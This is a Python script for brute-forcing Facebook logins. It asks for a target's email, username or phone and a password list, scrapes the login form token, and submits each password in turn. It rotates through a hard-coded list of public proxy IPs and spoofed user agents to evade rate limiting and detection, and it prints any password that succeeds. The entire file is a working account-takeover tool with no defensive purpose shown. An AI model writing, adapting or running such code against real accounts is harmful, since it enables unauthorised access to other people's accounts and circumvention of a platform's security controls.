# =============> Import <=============
import sys, os, requests, random, logging, time
from bs4 import BeautifulSoup
from termcolor import colored
# =============> Console Colors <=============
class CliColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
# =============> Config <=============
MIN_PASSWORD_LENGTH = 6 # minimum length of the facebook password
MAIN_FB_DOMAIN = 'https://mbasic.facebook.com'
LOGIN_URL = MAIN_FB_DOMAIN+'/login.php'
USER_AGENTS = [
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)',
    'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
    'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1'
]
PROXIES = [
    'http://10.10.1.10:3128',
    'http://77.232.139.200:8080',
    'http://78.111.125.146:8080',
    'http://77.239.133.146:3128',
    'http://74.116.59.8:53281',
    'http://67.53.121.67:8080',
    'http://67.78.143.182:8080',
    'http://62.64.111.42:53281',
    'http://62.210.251.74:3128',
    'http://62.210.105.103:3128',
    'http://5.189.133.231:80',
    'http://46.101.78.9:8080',
    'http://45.55.86.49:8080',
    'http://40.87.66.157:80',
    'http://45.55.27.246:8080',
    'http://45.55.27.246:80',
    'http://41.164.32.58:8080',
    'http://45.125.119.62:8080',
    'http://37.187.116.199:80',
    'http://43.250.80.226:80',
    'http://43.241.130.242:8080',
    'http://38.64.129.242:8080',
    'http://41.203.183.50:8080',
    'http://36.85.90.8:8080',
    'http://36.75.128.3:80',
    'http://36.81.255.73:8080',
    'http://36.72.127.182:8080',
    'http://36.67.230.209:8080',
    'http://35.198.198.12:8080',
    'http://35.196.159.241:8080',
    'http://35.196.159.241:80',
    'http://27.122.224.183:80',
    'http://223.206.114.195:8080',
    'http://221.120.214.174:8080',
    'http://223.205.121.223:8080',
    'http://222.124.30.138:80',
    'http://222.165.205.204:8080',
    'http://217.61.15.26:80',
    'http://217.29.28.183:8080',
    'http://217.121.243.43:8080',
    'http://213.47.184.186:8080',
    'http://207.148.17.223:8080',
    'http://210.213.226.3:8080',
    'http://202.70.80.233:8080',
]
PAYLOAD = {}
COOKIES = {}
HEADERS = {}
# =============> Log <=============
class Log(object):
    def __init__(self, filename):
        super(Log, self).__init__()
        self.filename = filename
        self.logging = logging
        self.logging.basicConfig(format='%(asctime)s %(levelname)s: %(message)s', datefmt='%Y/%m/%d %I:%M:%S %p', filename=filename, level=self.logging.INFO)
    def write(self, msg, color=''):
        print(color+msg)
        self.logging.info(msg)
    def write_colored(self, msg, color=''):
        # Text colors:
        # grey
        # red
        # green
        # yellow
        # blue
        # magenta
        # cyan
        # white

        # Text highlights:
        # on_grey
        # on_red
        # on_green
        # on_yellow
        # on_blue
        # on_magenta
        # on_cyan
        # on_white

        # Attributes:
        # bold
        # dark
        # underline
        # blink
        # reverse
        # concealed
        if color: print(colored(msg, color))
        else: print(msg)
        self.logging.info(msg)
# =============> Functions <=============
def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'referer': LOGIN_URL,
        'content-type': 'application/x-www-form-urlencoded',
        'origin': MAIN_FB_DOMAIN
    }

def form_data():
    form = {}
    cookies = {
        'wd': '1366x663',
        'm_pixel_ratio': '1',
        'locale': 'en_US'
    }
    headers = get_random_headers()
    random_proxy = random.choice(PROXIES)
    proxy = {'http': random_proxy}

    data = requests.get(LOGIN_URL, headers=headers, proxies=proxy)
    for i in data.cookies:
        cookies[i.name] = i.value

    data = BeautifulSoup(data.text, 'html.parser').form

    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']

    return form, cookies

def Login(user, password, index=1):
    global PAYLOAD, COOKIES, HEADERS
    if index % 5 == 0:
        PAYLOAD, COOKIES = form_data()
        HEADERS = get_random_headers()
    else:
        if len(PAYLOAD) < 1 or len(COOKIES) < 1:
            PAYLOAD, COOKIES = form_data()
        if len(HEADERS) < 1:
            HEADERS = get_random_headers()
    PAYLOAD['email'] = user
    PAYLOAD['pass'] = password
    random_proxy = random.choice(PROXIES)
    PROXY = {'http': random_proxy}
    r = requests.post(LOGIN_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS, proxies=PROXY)
    rurl = r.url.lower()
    rtext = r.text.lower()
    if '/login/save-device' in rurl or '/checkpoint' in rurl or MAIN_FB_DOMAIN == rurl or '/home' in rurl or 'log out' in rtext or 'find friends' in rtext or 'search' in rtext:
        return [True, password]
    return [False, password]
# =============> Arguments <=============
def args():
    import argparse
    parser = argparse.ArgumentParser(description='Facebook Login Brute Force')
    parser.add_argument('-u', '--user', help='Email/Username/ID/Phone')
    parser.add_argument('-p', '--password-list', help='Password List Filename')
    parser.add_argument('-sp', '--single-password', help='Password')
    parser.add_argument('-l', '--log', help='Log Filename')
    return parser.parse_args()
# =============> Main <=============
def main(args=None):
    print(CliColors.HEADER+"""
 ____  __    ___  ____  ____   __    __  __ _     ____  ____  _  _  ____  ____     ____  __  ____   ___  ____ 
(  __)/ _\  / __)(  __)(  _ \ /  \  /  \(  / )___(  _ \(  _ \/ )( \(_  _)(  __)___(  __)/  \(  _ \ / __)(  __)
 ) _)/    \( (__  ) _)  ) _ ((  O )(  O ))  ((___)) _ ( )   /) \/ (  )(   ) _)(___)) _)(  O ))   /( (__  ) _) 
(__) \_/\_/ \___)(____)(____/ \__/  \__/(__\_)   (____/(__\_)\____/ (__) (____)   (__)  \__/(__\_) \___)(____)
""")
    print("")

    if args and args.single_password and args.password_list:
        print(CliColors.FAIL+"[x] You can't use single password with password list.")
        sys.exit(-2)

    log_filename = 'logging.log'
    if args and args.log:
        log_filename = args.log
    _log = Log(log_filename)

    if args and args.single_password:
        passwords = [args.single_password]
    else:
        if args and args.password_list:
            password_file = args.password_list
        else:
            password_file = input(CliColors.OKBLUE+"[?] Password List Filename: \t")

        if os.path.exists(password_file):
            with open(password_file, 'rt', newline='', encoding='utf-8') as file:
                passwords = file.read().replace("\r\n", "\n").replace("\r", "\n").split("\n")
        else:
            print(CliColors.FAIL+"[x] Passwords File does not exist.")
            sys.exit(-1)

    if args and args.user:
        user = args.user
    else:
        user = input(CliColors.OKBLUE+"[?] Email/Username/ID/Phone: \t")

    print("")
    print(CliColors.OKCYAN+"[*] Processing...")

    flag = [False, None]
    index = 1
    for password in passwords:
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            _log.write_colored("[!] Password '{}' is less than {} characters and has been ignored.".format(password, MIN_PASSWORD_LENGTH), 'grey')
            continue
        _log.write_colored("[*] Attempt #{} with user: '{}' and password: '{}'.".format(index, user, password), 'yellow')
        LoginOp = Login(user, password, index)
        if LoginOp[0]:
            flag = LoginOp
            break
        index += 1
    if flag[0]:
        _log.write_colored("[+] Password Found: '{}'.".format(flag[1]), 'green')
    else:
        _log.write_colored("[-] No Password was Found.", 'red')
    print("")

if __name__ == '__main__':
    sys.exit(main(args()))